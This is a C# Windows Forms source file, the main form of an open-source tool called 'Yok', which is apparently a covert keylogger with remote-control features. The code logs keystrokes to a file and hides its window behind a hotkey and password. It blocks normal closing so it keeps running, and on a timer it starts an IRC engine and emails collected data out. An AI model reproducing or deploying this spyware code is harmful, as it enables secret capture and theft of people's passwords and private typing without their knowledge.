// Yok 
// https://github.com/erickjung/yok
//
// Copyright (c) 2012-2015 Erick Jung
//
// This code is distributed under the terms and conditions of the MIT license.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
// THE SOFTWARE.

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;
using log4net;
using yok.App.Engine;
using yok.Util;

namespace yok.App.Forms
{
    /// <summary>
    ///     Main form
    /// </summary>
    public partial class MainForm : Form
    {
        private static readonly ILog Logger = LogManager.GetLogger(typeof (MainForm));

        /// <summary>
        ///     Main form
        /// </summary>
        public MainForm()
        {
            InitializeComponent();

            StartHook();

            StartKeyLogger();

            StartTimer();
        }

        /// <summary>
        ///     Start key logger service
        /// </summary>
        private void StartKeyLogger()
        {
            Logger.Info("Init keylogger");

            keylogger.Enabled = Config.GetBoolValue(Globals.YokXmlUsekeylogger);
        }

        /// <summary>
        ///     Start key hook
        /// </summary>
        private void StartHook()
        {
            Logger.Info("Init hook");

            const Keys k = Keys.K | Keys.Control | Keys.Alt;
            Hook.RegisterHotKey(this, k);
        }

        /// <summary>
        ///     Start main timer
        /// </summary>
        private void StartTimer()
        {
            Logger.Info("Init timer");

            if (Config.GetIntValue(Globals.YokXmlTimerinterval) > 0)
            {
                timer.Start();
            }
            else
            {
                timer.Stop();
            }
        }

        /// <summary>
        ///     Catch the hook key
        /// </summary>
        /// <param name="m"></param>
        protected override void WndProc(ref Message m)
        {
            try
            {
                base.WndProc(ref m);

                if (m.Msg == Hook.WmHotkey)
                {
                    if (!Visible)
                    {
                        var ib = new InputBoxDialog
                        {
                            FormPrompt = Config.GetStringValue(Globals.YokXmlInputmsg),
                            FormCaption = Config.GetStringValue(Globals.YokXmlInputtitle),
                            DefaultValue = ""
                        };
                        ib.ShowDialog();

                        var s = ib.InputResponse;
                        ib.Close();

                        if (s.Equals(Config.GetStringValue(Globals.YokXmlInputpwd)))
                        {
                            Visible = true;
                        }
                        else
                        {
                            MessageBox.Show("Password error!", "!!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                        }
                    }
                    else
                    {
                        Visible = false;
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Error(ex);
            }
        }

        /// <summary>
        ///     Avoid closing the app
        /// </summary>
        /// <param name="e"></param>
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);

            if (e.CloseReason == CloseReason.WindowsShutDown)
            {
                return;
            }

            e.Cancel = true;
            Visible = false;
        }

        /// <summary>
        ///     Keylogger callback
        /// </summary>
        /// <param name="vkcode"></param>
        /// <param name="isDown"></param>
        private void KeyloggerVkCode(int vkcode, bool isDown)
        {
        }

        /// <summary>
        ///     Keylogger callback
        /// </summary>
        /// <param name="value"></param>
        /// <param name="isChar"></param>
        /// <param name="isDown"></param>
        private void KeyloggerVkCodeAsString(string value, bool isChar, bool isDown)
        {
            try
            {
                var result = value;

                if (isChar && !isDown)
                {
                    return;
                }

                if (!isChar)
                {
                    result = "-";
                }

                TextWriter tw = new StreamWriter(Logs.LogKey, true, Encoding.Default);
                tw.Write(result);
                tw.Close();
            }
            catch (Exception ex)
            {
                Logger.Error(ex);
            }
        }

        // -------------------------
        // THREADS
        // -------------------------

        /// <summary>
        ///     The main timer tick
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void TimerTick(object sender, EventArgs e)
        {
            try
            {
                // always check the services, so we can enable/disable anytime
                StartKeyLogger();
                StartTimer();

                if (Config.GetIntValue(Globals.YokXmlTimerinterval) > 0)
                {
                    timer.Interval = Config.GetIntValue(Globals.YokXmlTimerinterval);
                }

                var bw = new BackgroundWorker();

                bw.DoWork += DoWork;
                bw.RunWorkerCompleted += RunWorkerCompleted;
                bw.RunWorkerAsync();
            }
            catch (Exception ex)
            {
                Logger.Error(ex);
            }
        }

        /// <summary>
        ///     Execute all the services
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void DoWork(object sender, DoWorkEventArgs e)
        {
            Logger.Info("starting irc");

            if (Config.GetBoolValue(Globals.YokXmlUseirc))
            {
                if (!IrcEngine.GetInstance().Start())
                {
                    Logger.Error("Irc start failed");
                }
            }
            else
            {
                if (!IrcEngine.GetInstance().Stop())
                {
                    Logger.Error("Irc stop failed");
                }

                Logger.Info("IRC DISABLED");
            }

            Logger.Info("starting email");

            if (Config.GetBoolValue(Globals.YokXmlUseemail))
            {
                if (ScheduleEngine.Check())
                {
                    if (!EmailEngine.Send())
                    {
                        Logger.Error("Email send failed");
                    }
                }
                else
                {
                    Logger.Info("Data not ready to send");
                }
            }
            else
            {
                Logger.Info("EMAIL DISABLED");
            }
        }

        /// <summary>
        ///     Post execution
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            // do nothing for now
        }

        // -------------------------
        // UI
        // -------------------------

        private void ButtonStatusClick(object sender, EventArgs e)
        {
            var f = new PanelStatus {TopLevel = false};

            panelStatus.Controls.Clear();
            panelStatus.Controls.Add(f);
            f.Show();
        }

        private void ButtonMainConfigClick(object sender, EventArgs e)
        {
            var f = new PanelMainConfig {TopLevel = false};

            panelStatus.Controls.Clear();
            panelStatus.Controls.Add(f);
            f.Show();
        }

        private void ButtonEmailConfigClick(object sender, EventArgs e)
        {
            var f = new PanelEmailConfig {TopLevel = false};

            panelStatus.Controls.Clear();
            panelStatus.Controls.Add(f);
            f.Show();
        }

        private void ButtonIrcConfigClick(object sender, EventArgs e)
        {
            var f = new PanelIrcConfig {TopLevel = false};

            panelStatus.Controls.Clear();
            panelStatus.Controls.Add(f);
            f.Show();
        }

        private void MainFormLoad(object sender, EventArgs e)
        {
            var f = new PanelStatus {TopLevel = false};

            panelStatus.Controls.Clear();
            panelStatus.Controls.Add(f);
            f.Show();
        }

        private void ButtonAboutClick(object sender, EventArgs e)
        {
            var f = new PanelAbout {TopLevel = false};

            panelStatus.Controls.Clear();
            panelStatus.Controls.Add(f);
            f.Show();
        }

        private void ButtonFolderClick(object sender, EventArgs e)
        {
            Process.Start(Utils.GetBasePath());
        }
    }
}